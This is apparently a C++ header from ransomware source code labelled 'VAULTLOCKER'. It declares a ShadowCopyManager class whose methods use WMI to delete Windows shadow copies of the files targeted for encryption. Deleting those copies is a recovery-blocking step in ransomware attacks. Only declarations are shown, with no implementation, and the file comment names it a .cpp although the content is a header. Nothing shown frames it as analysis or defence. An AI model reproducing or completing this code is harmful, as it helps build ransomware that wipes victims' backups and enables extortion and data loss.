// VAULTLOCKER. 2024
// ShadowCopyManager.cpp - ShadowCopyManager HEADER

#ifndef SHADOWCOPYMANAGER_H
#define SHADOWCOPYMANAGER_H

#include <string>
#include <vector>
#include <Windows.h>
#include <comdef.h>
#include <Wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")

class ShadowCopyManager {
public:
    ShadowCopyManager();
    ~ShadowCopyManager();

    bool Initialize();
    void Cleanup();

    bool DeleteShadowCopiesOfFilesToEncrypt(const std::vector<std::wstring>& filePaths);

private:
    bool DeleteShadowCopy(const std::wstring& shadowCopyPath);
    bool IsShadowCopyRelatedToFilesToEncrypt(const std::wstring& shadowCopyPath, const std::vector<std::wstring>& filePaths);

private:
    bool initialized;
};

#endif // SHADOWCOPYMANAGER_H
